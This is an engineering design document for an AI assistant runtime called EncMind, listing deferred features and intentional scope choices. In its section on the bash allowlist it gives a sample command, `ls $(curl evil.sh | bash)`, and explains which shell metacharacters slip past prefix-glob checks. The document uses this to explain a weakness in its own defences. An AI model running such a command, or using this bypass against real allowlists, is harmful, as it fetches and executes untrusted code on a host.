# Deferred Items

Runtime gaps that have been intentionally deferred or rescoped, with a short
rationale for each. Use this as a pre-flight checklist before filing new
"why isn't X implemented" issues — nearly every item here has a known home in
the Phase B/C/D roadmap or an explicit decision to keep the current
implementation simple.

Read alongside [`v2-architecture-roadmap.md`](./v2-architecture-roadmap.md);
this doc tracks the **state** of deferred items (and the reason for
deferring), while the roadmap tracks the **target design**.

Last updated: 2026-04-09.

---

## Tier 1 — shipped in this pass

Items previously on this list that landed during the "operational polish"
branch. Kept here for one release cycle as a cross-reference so changelogs
and old issues point somewhere useful.

- **QueryClass-aware retry policy** — `crates/llm/src/retry.rs` now reads
  the task-local `CURRENT_QUERY_CLASS` and builds `RetryPolicy::for_class`:
  `Interactive` keeps the full 3-retry budget, `Background` bails after one
  retry to avoid amplifying upstream cascades. `529` ("Overloaded") is now
  in the retryable set alongside 429/500/502/503/504 and `"overloaded"`
  text matching. The overall run is still bounded by
  `AgentPool::per_session_timeout_secs`.
- **ToolProgress streaming events** — `ChatEvent::ToolProgress { tool_use_id,
  tool_name, message, fraction }` emitted between `ToolStart` and
  `ToolComplete`. Tool handlers opt in via a task-local sink in
  `crates/agent/src/tool_progress.rs` by calling `report_status(...)` or
  `report_progress(..., Some(fraction))`. Sink is wired around both the
  sequential and the parallel dispatch paths.
- **Per-turn metrics in `chat.send` response** — response payload gains a
  `metrics` object: `{ model, model_name, provider, input_tokens,
  output_tokens, total_tokens, iterations, latency_ms }`. Wall-clock timing
  is captured at handler entry. Cancelled-path responses also include the
  metrics object.
- **Per-turn cost attribution persistence** — new `api_usage` SQLite table
  (migration v8), `ApiUsageStore` in `crates/storage/src/api_usage.rs`, and
  admin RPC `api_usage.query` with filters by session/agent/channel/time and
  an aggregate roll-up. One row written per completed `chat.send`, best-
  effort (insert failures log a warning but never fail the response).
- **`chat.send` max output tokens policy** — optional `max_output_tokens`
  request param and `token_optimization.per_channel_max_output_tokens`
  config map let operators cap per-channel response length (clamped to the
  session default).

---

## Tier 2 — Phase B (planned, not yet implemented)

Medium-effort items that belong to Phase B ("Cost & Performance"). Design
is in the roadmap; implementation waits until Tier 1 is stable and the
operator feedback justifies the build cost.

### B.1 — Prompt compiler + static/dynamic cache boundary

**Status:** deferred. Referenced at `docs/design/v2-architecture-roadmap.md`
section B.1 and the Phase B table row.

**Why deferred:** cache integration is provider-specific (Anthropic prompt
caching), and the ordering constraint inside the compiled prompt matters
for cache hits. Current sliding-window + hand-concatenated system prompt is
functional; the payoff is cost reduction on repeat turns, which we don't
have metrics to quantify yet (see Tier 1 item on per-turn cost attribution).

**Design notes for when we pick it up:**

- Static sections (behavioral governance, tool usage grammar, channel hint)
  go on the cacheable side of the boundary.
- Dynamic sections (memory context, session-specific hints) go after the
  boundary.
- Cache-break blame diagnostic: on cache miss, hash each section
  independently and diff against the last request's hashes. Emit a report
  identifying which section changed. Without this, operators will see
  "cache hit rate dropped" with no way to find the cause.

### B.3 — Multi-strategy compaction

**Status:** deferred. Current implementation is sliding window + per-tool
result truncation; see `crates/agent/src/runtime.rs` `maybe_compact` and
`crates/agent/src/context.rs` `apply_sliding_window`.

**Why deferred:** functional for current session lengths. Multi-strategy
compaction (summarization, entity extraction, tool-result condensation,
selective forget) requires a compaction controller plus a prompt template
library. Roadmap target: B.3 "Multi-strategy compaction + structured
prompt" — 4 strategies + 2 controls + a 9-section summary template.

### B.11 — Permission explainer side-query

**Status:** deferred. Roadmap table B.11.

**Why deferred:** the current governance pipeline emits structured
`PermissionDecision` records with `source`, `rule_id`, and `reason` fields
(shipped in A.3). An LLM-powered explainer would run concurrently with the
permission check and show a human-readable rationale alongside. Useful for
interactive prompts, low value in a channel-based assistant where the deny
message already contains the reason string.

### B.12 — LLM memory selection (2-stage rerank + MMR)

**Status:** deferred. Roadmap table B.12.

**Why deferred:** current retrieval is vector + FTS5 with RRF fusion
(`crates/memory/src/memory_store.rs`), which is a solid baseline. A 2-stage
pipeline with an LLM reranker plus MMR diversity is a measurable quality
improvement when retrieval precision is the bottleneck — we don't have an
eval set showing that yet. Roadmap includes `retrieval.quality_gate` and an
eval runner (`cli memory eval`) for when the quality measurement is in
place.

---

## Tier 3 — Phase C (multi-agent orchestration)

Large items that need the Phase A streaming executor and governance
pipeline (both shipped). Design is in the roadmap; implementation is gated
on concrete user requests and use-case clarity.

### C.1 — Built-in agent roles with permission isolation

**Status:** deferred AND re-scoped. Roadmap table C.1.

**Re-scope:** Claude Code's taxonomy (Explore / Plan / Implement / Verify) is
code-tool shaped. For a general AI assistant the analog is more like
Researcher / Composer / Verifier / Operator — or some other set chosen per
deployment. The roadmap target should be **the permission isolation
mechanism**, not a specific role list. Operators define their own
taxonomies; the runtime just enforces hard tool filters per role.

Current state: EncMind already has `agents.subagents.allow_agents` (skill
filtering per agent) and `workspace_trust` (read/write/exec gating per
workspace). C.1 would layer a role abstraction on top, not replace these.

### C.5 — Fork subagents with prompt cache sharing

**Status:** deferred. Roadmap table C.5.

Needs B.1 (prompt compiler) as a prerequisite — a child subagent inherits
the parent's cacheable prefix so cross-agent context sharing hits the cache.

### C.6 — Deferred tool loading (ToolSearch-style)

**Status:** deferred. Roadmap table C.6.

**Why deferred:** EncMind's current registered tool count is ~15–20
(built-ins + plugins + WASM skills). Full `tool_definitions()` per turn is
a few KB of prompt, which is negligible compared to history and memory
context. Deferred tool loading becomes worthwhile only once MCP server
proliferation pushes the total tool count into the 50+ range. Revisit when
profiling shows the tool schema block dominating the prompt.

### C.2 — Coordinator mode + async notifications + worker progress

**Status:** partially shipped (coordinator mode prompt is in A.7); full
async worker orchestration deferred. Roadmap table C.2.

### C.3 / C.4 — Planning tasks / runtime execution tasks

**Status:** deferred. Roadmap table C.3 and C.4.

Persistent planning tasks and ephemeral runtime execution tasks are useful
for long-running multi-step goals but not necessary for request-response
chat. Defer until there's a concrete use case.

### C.7 — Stop hooks + continuation prevention

**Status:** deferred. Roadmap table C.7.

---

## Tier 4 — architectural/reliability, no firm timeline

Items that are architecturally significant but not currently justified by
operator feedback or profiling data. Keep tracked so we don't re-derive the
cost analysis every review.

### Error token undercount on late-failure paths

**Status:** deferred. Identified 2026-04-09.

The `api_usage` error rows persist 0 tokens because the handler only sees
`Err(AppError)` — no `RunResult`. In practice, a late failure (e.g. session
store persistence after the LLM already generated output) **has** consumed
tokens, but those counts are lost when `run_inner` exits via `Err`. The
correct fix is runtime-level: either change `run` to return
`Result<RunResult, (PartialRunResult, AppError)>` so the error side carries
whatever tokens were counted before the failure, or use shared atomic
counters that persist across the `Err` return. Handler-only heuristics
would be guessing. The current 0-token rows are still better than the
prior state (no row at all): operators can count errors and see latency;
actual token cost attribution for late failures is the next refinement.

### Bounded scheduler queue

**Status:** deferred. Identified 2026-04-09.

`TwoClassScheduler` uses `mpsc::unbounded_channel`, so waiters can grow
without hard backpressure under bursty load. In practice each waiter is
~64 bytes (`oneshot::Sender<OwnedSemaphorePermit>`), so 10,000 queued
requests is ~640 KB — not OOM territory. Real backpressure is enforced at
the WebSocket layer (`connection_permits`) and the query guard
(`max_queued_per_session`). A bounded channel would require deciding what
to do on overflow (reject with error or block the caller); both options add
complexity for a scenario that hasn't been observed in practice. If
profiling shows memory pressure from waiter accumulation, add a
`max_pending_requests: usize` config field that caps the channel depth.

### Interleaved tool dispatch during LLM streaming

**Status:** deferred indefinitely.

**Why:** the latency win is smaller than it sounds. Most LLMs emit
`tool_use` blocks at the end of a turn after reasoning completes. The
savings materialize only when:

1. The LLM emits a tool_use mid-stream and keeps generating after (rare in
   current models), or
2. Multiple independent tool_uses arrive during the stream and would
   otherwise queue.

The current "collect → validate → dispatch" path keeps ordering and
cancellation simple. Revisit only when profiling shows tool dispatch
latency is the bottleneck. ToolProgress events (Tier 1, shipped) close
most of the user-visible "long silence" UX gap without the architectural
cost.

### WebSocket reconnect + event replay

**Status:** deferred. No roadmap entry; belongs under "Phase B reliability"
when that's written.

**Why deferred:** the self-hosted deployment shape is "gateway and clients
on the same host or tailnet", so disconnect mid-run is rare. Fully-correct
replay needs sequence IDs on every `ChatEvent`, a ring buffer per active
run, client-side `Last-Event-ID` on reconnect, server-side replay from the
buffer, and cleanup when the run completes. That's a whole subsystem —
~1 week of focused work — that we don't currently need.

**Current bail-and-retry behavior:** `crates/local-client/src/chat.rs`
handles disconnects by timing out the request and returning an error.
Users can retry. `chat.abort` is supported for in-progress cancellation.

Revisit when operators report "my Telegram bot lost a cron response
mid-stream and the whole run was wasted."

### Non-interactive retry amplification dampening (beyond retry classification)

**Status:** partially mitigated by Tier 1 retry classification.

For future consideration: expose cron/webhook retry budgets in
`status.ready` endpoints so operators can observe "background class has
been bailing for 20 minutes, there's an upstream outage."

---

## Tier 5 — Phase D (long-term UX/autonomy)

Phase D items are correctly positioned as P3. None block day-to-day use;
each has independent operator value when implemented.

- **D.1 Dream memory consolidation** — nightly distillation of session
  notes into typed memory entries. Depends on B.7 memory taxonomy.
- **D.2 Auto-mode permission classifier** — feature-flagged LLM-powered
  permission decisions for nuanced cases. Already tracked.
- **D.6 Session fingerprinting & drift detection** — detect when the
  environment around a session has changed (e.g. file modifications while
  the session was idle).
- **D.8 Proactive / autonomous mode** — tick-based agent loop with
  focus-aware autonomy and anti-narration. Medium-large effort, needs
  careful scoping and operator opt-in.
- **D.9 Away summary** — 1–3 sentence recap of what happened while the
  user was idle. Small, high UX value.
- **D.10 Prompt suggestions** — 1–3 clickable next-action suggestions
  after each turn. Small, high UX value.
- **D.12 Session search (cross-session retrieval)** — find past sessions
  by topic, tag, or branch; distinct from memory search. Medium effort.
- **D.7 Swarm visualization** — multi-pane web UI for coordinator +
  workers. Medium effort, depends on C.2.

---

## Non-gaps (intentional choices, documented so they stay deferred)

These are decisions we've made explicitly to keep the current
implementation simple or because the alternative is premature. If you're
tempted to file an issue for these, re-read the rationale first.

### Tool input schema validation is fail-open

Schema mismatches log a warning and proceed with the LLM-provided input
rather than rejecting pre-dispatch. See `crates/agent/src/tool_registry.rs`
`validate_tool_input`.

**Why:** LLMs routinely emit near-miss inputs (stringified numbers, extra
fields). A hard schema reject would turn transient model sloppiness into
tool errors; individual tool handlers remain the authoritative validators.
A **per-tool strict mode** for high-risk tools is a future enhancement
tracked as part of B.8 — the global default stays fail-open.

### Bash allowlist wildcard is not a bash injection defense

The prefix-glob allowlist (e.g. `"ls*"` matches `ls -la` but not `lsblk`)
plus separator detection (`;`, `&&`, `||`, `|`, `\n`, `\r`) blocks the
most obvious command-chaining attempts, but it does **not** cover command
substitution (`$()`, backticks), process substitution (`<(...)`, `>(...)`),
shell redirects (`>`, `<`, `>>`), or parameter expansion (`$VAR`). An
operator configuring `"ls*"` is not protected from
`ls $(curl evil.sh | bash)`.

**Why intentional:** prefix-glob allowlisting can't be fully safe in
bash's grammar — there are too many metacharacters. The current guard
addresses the class of attack it claims (multiline/chained) and is a real
improvement over no check at all. Operators wanting strong containment
should use **exact-match** patterns (e.g. `"git status"`, `"cargo check"`)
rather than wildcards. Documented in `crates/core/src/bash_allowlist.rs`.

### Prompt cache / rate limit UX coaching

Claude Code has human-readable rate limit messages and prompt cache
break-detection diagnostics. EncMind doesn't.

**Why intentional for now:** coaching messages belong in the REPL UX layer,
not the server. Cache diagnostics belong in B.1 (see Tier 2). EncMind's
channel-based UX (Telegram/Slack/Gmail) doesn't have a natural surface
for rate-limit coaching.

### GrowthBook feature gate caching

Claude Code uses GrowthBook for runtime feature flags with stale-while-
revalidate caching. EncMind uses static config files with an operator
reload path.

**Why intentional:** EncMind is self-hosted. Operators edit config files
and restart (or hot-swap where supported). Feature gate infrastructure is
unnecessary complexity for the deployment shape.

### Voice mode infrastructure

Claude Code ships push-to-talk, streaming STT, and keyword extraction for
voice command routing.

**Why intentional:** EncMind is a server-side assistant. Voice is a client
concern; if any EncMind client adds it, the STT integration lives there,
not in the gateway.

### `+500k` token budget shorthand in user input

Claude Code's REPL parses `+500k` in user messages as a mid-conversation
token budget directive.

**Why intentional:** REPL-specific DSL. Channel-based users don't type
budget annotations. The underlying "per-turn output cap" need is handled
by the programmatic `max_output_tokens` request param and the
`per_channel_max_output_tokens` config map (both shipped in Tier 1).

### Per-call effort mode override

Claude Code exposes an `anthropic_internal.effort_override` API body
field for per-call reasoning effort tuning.

**Why intentional:** EncMind is multi-provider. A provider-specific API
hint doesn't fit the current `CompletionParams` abstraction, and the
benefit is small compared to choosing the right model upfront.

---

## Process

**When to promote a deferred item to active work:**

1. Operator feedback or profiling data says the current behavior is
   actually hurting users (not just "it's less nice than Claude Code").
2. The item's prerequisites are shipped (e.g. B.1 before C.5).
3. There's at least one concrete use case or failure mode that the
   implementation will fix.

**When to add to this list:**

1. The gap is real and has a known home in the roadmap — add it with the
   roadmap section reference.
2. The gap is architectural and doesn't justify the cost yet — document
   the cost/benefit analysis so we don't re-derive it.
3. The gap is an intentional scope choice — add it under "Non-gaps" with
   the rationale so future reviewers stop re-asking.

**Don't add:**

1. Implementation details that can be found by reading the code.
2. Aspirational features with no roadmap position. Put those in the
   roadmap first, then reference them here.
3. Items already in the current sprint — those belong in task trackers.
